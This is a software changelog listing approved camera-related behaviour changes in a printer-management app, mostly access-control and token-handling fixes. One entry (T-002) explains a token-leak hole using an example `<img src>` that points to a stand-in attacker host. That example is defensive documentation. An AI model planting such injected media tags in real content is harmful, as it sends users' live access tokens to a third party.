# Baseline Changelog — campaign 22 (camera wall + card hover dwell)

User-approved behavior changes made during the refactor campaign, each an
explicit exception to the campaign's zero-functionality-change rule. Every
entry names the task, what changed, which golden probe(s) / SURFACE.md
sections were re-recorded in the same commit, and the approval date.

Campaign 22 re-baselined this file at setup (2026-09-29). The entries of
campaigns 1–21 live in git history (`git log -p -- BASELINE-CHANGELOG.md`
before the `chore(refactor-loop): setup` commit tagged `refactor-base`) and
in each campaign's archived FINAL_REPORT.md.

## T-001 — create_stream_token refuses printer-restricted API keys (user-approved 2026-09-29)

`POST /api/v1/printers/camera/stream-token` now returns 403 when the caller is
an API key with `printer_ids` set (auth enabled). The minted token carries no
printer allowlist, so such a key previously got a token that opened every
printer's `/camera/stream` and `/camera/snapshot`. JWT users, unrestricted
keys and the auth-disabled path are unchanged. The key is resolved via the
existing `_grid_stream_api_key_if_auth_enabled` dependency.

- Golden probes re-recorded: none (13/13 match; no `responses=` declared, so
  `camera-contract` / `app-openapi-index` are unchanged).
- SURFACE.md sections regenerated: "Route signatures — grid stream, hub
  status, stream token, stream, stop" (new `api_key` parameter on
  `create_stream_token`).

## T-002 — only rewrite same-origin /api/v1/ media srcs with the stream token (user-approved 2026-09-29)

`frontend/src/hooks/useCameraStreamToken.ts` gained a module-private
`isSameOriginApiV1Src(src)` helper (resolves `src` against
`window.location.href`, returns true only when the resolved URL's origin
matches the page's origin and its pathname starts with `/api/v1/`; an
unparseable `src` returns `false` without throwing). It now gates all three
places that append or recognise a stream token on an `<img>`/`<video>` src:
`isCameraUrl` (only classifies a same-origin `/api/v1/` src containing
`/camera/` as a camera URL), `rewriteMediaSrcWithToken` (skips appending
`?token=` to any src that fails the gate), and the capture-phase `load`-error
listener in `useStreamTokenSync` (skips srcs that fail the gate when
deciding whether to retry/clear a token). Relative srcs are unaffected: they
still resolve against `window.location.href` and are rewritten exactly as
before. The commit was flagged by the blind verifier as an observable
behavior change with no changelog entry (at BASE, a cross-origin src such as
`https://attacker.example/api/v1/x` received the viewer's camera or media
token appended as `?token=...`); the user approved it after that flag, on
2026-09-29, as the fix for that disclosure. The risk is real: user-editable
content (e.g. project notes sanitized with DOMPurify, which keeps `<img
src>`) can embed an attacker-controlled `<img src="https://attacker.example/
api/v1/...">`, and before this change the viewer's live token would be
appended to it and sent to that third-party origin on load. What is
unchanged: every URL the app itself constructs for camera/media elements is
relative or already same-origin, so normal camera grids, snapshots, and
media playback still get their token exactly as before; only
attacker-controlled cross-origin srcs stop receiving a token. This addendum
commit is the changelog entry for commit 702605c33 "refactor(loop-1): T-002
only rewrite same-origin /api/v1/ media srcs with the stream token".

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none.

## T-011 — grid-stream answers 503 + Retry-After when the load gate refuses every producer (user-approved 2026-09-29)

`camera_grid_stream` in `backend/app/api/routes/camera.py` now tells apart
the two ways a request can end with no producer. When the requested printers
exist and can stream through the hub (no external camera), but the
spawn-time load gate in `_ensure_producer` refused every one of them, the
route raises `HTTPException(503, "Camera producers temporarily unavailable
(system under load)")` with a `Retry-After: 5` header. The 5 seconds is the
new module constant `_GRID_SPAWN_REFUSED_RETRY_AFTER`, defined next to
`_SPAWN_LOAD_THRESHOLD`. Before this change the route answered
`404 "No valid printers found"`, which the camera wall treats as terminal, so
a wall that connected during a load spike stayed dead until someone pressed
Restart. Unchanged: no printers found, none allowed by an API key's
allowlist, or only external-camera printers still get the same 404; a
request where at least one producer starts still streams as before.
Frontend: no change. `useGridStream.ts` already sends every 5xx through the
existing backoff reconnect path, and its only terminal branch is 4xx other
than 408/429. The existing T-138 hook test "still retries on a 500" covers
that path.

- Golden probes re-recorded: none (13/13 match; no `responses=` declared).
- SURFACE.md sections regenerated: none (route signature unchanged).

## T-003 — grid-stream `?force=true` requires `settings:update` (user-approved 2026-09-29)

`camera_grid_stream` in `backend/app/api/routes/camera.py` now checks, only
when `force` is true, that the caller also holds `Permission.SETTINGS_UPDATE`
(new private helper `_require_grid_stream_force_permission`, called at the
top of the route body). A forced restart tears down the shared ffmpeg
producers every other camera wall and single-camera viewer is watching, so it
is an administrative action; `SETTINGS_UPDATE` was chosen because it is the
permission that changes the camera quality preset (the settings route already
stops every producer on a preset change) and no camera-specific admin
permission exists (`CAMERA_VIEW` is the only camera permission). JWT users
without it get `403 "Missing required permissions: settings:update"`; admins
pass (they hold every permission). API keys go through the normal
`authorize_api_key` gate, where `SETTINGS_UPDATE` is administrative, so any
key with `force=true` gets `403 "API keys cannot be used for administrative
operations"`. Before this change any `camera:view` caller (user or
read-status key) could restart every viewer's producers. Unchanged: requests
without `force` keep exactly the old auth (CAMERA_VIEW + optional API-key
printer allowlist); auth-disabled deployments keep `force` working; the route
signature and OpenAPI are unchanged (runtime check, no new dependency, no
`responses=`). The frontend never sends `force`.

- Golden probes re-recorded: `camera-route-perms` (new line
  `3 Permission.SETTINGS_UPDATE`); the other 12 match.
- SURFACE.md sections regenerated: "Permissions guarding camera routes (count
  per permission)" (same new line).
